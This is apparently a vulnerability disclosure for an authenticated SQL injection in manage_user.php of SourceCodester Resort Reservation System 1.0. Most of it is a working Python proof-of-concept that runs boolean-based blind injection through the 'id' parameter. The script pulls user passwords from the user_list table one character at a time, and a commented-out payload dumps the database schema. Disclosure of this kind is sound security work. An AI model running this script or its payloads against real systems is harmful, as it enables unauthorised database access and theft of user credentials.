# SourceCodester Resort Reservation System 1.0 has a SQL Injection vulnerability in manage_user.php
## Software

- Software: Resort Reservation System 1.0
- Software Link: https://www.sourcecodester.com/php/16447/resort-reservation-system-php-and-sqlite3-source-code-free-download.html
- Vulnerability Type: SQL Injection
- Attack Type: Remote
- Vendor of Product: Sourcecodester

## Description

SourceCodester Resort Reservation System 1.0 has a SQL Injection vulnerability in manage_user.php. Affected is file manage_user.php, the manipulation of the argument id leads to SQL injection after users logged in.When the boolean value is true, the keyword "Update User Details" will appear on the page. Based on this feedback, a remote attacker can exploit SQL boolean-based blind injection to retrieve all data from the database.

## Vulnerability Code
![](https://github.com/Yesec/Resort-Reservation-System/assets/19534204/1b7469e2-5db5-4a58-a66f-ef472233c922)


## POC

```python
import requests
import string

url = "http://localhost/index.php?page=manage_user&id="
cookie = {"PHPSESSID":"f887a8f5b6e7aeecbfe2daa133dc224c"}
res = ""
dict = string.ascii_letters + string.digits + " " +string.punctuation

for i in range(1,50):
    for j in dict:
        # payload = "100' or substr((select group_concat(sql) from sqlite_master),%s,1)='%s" % (i, j)
        payload = "100' or substr((select group_concat(password) from user_list),%s,1)='%s" % (i, j)
        response = requests.get(url+payload, cookies=cookie)
        if "Update User Details" in response.text:
            res += j
            print("[*] Found: ",res)
            break
```

![](https://github.com/Yesec/Resort-Reservation-System/assets/19534204/86d33754-51ea-4102-a986-afe9fbf7c913)
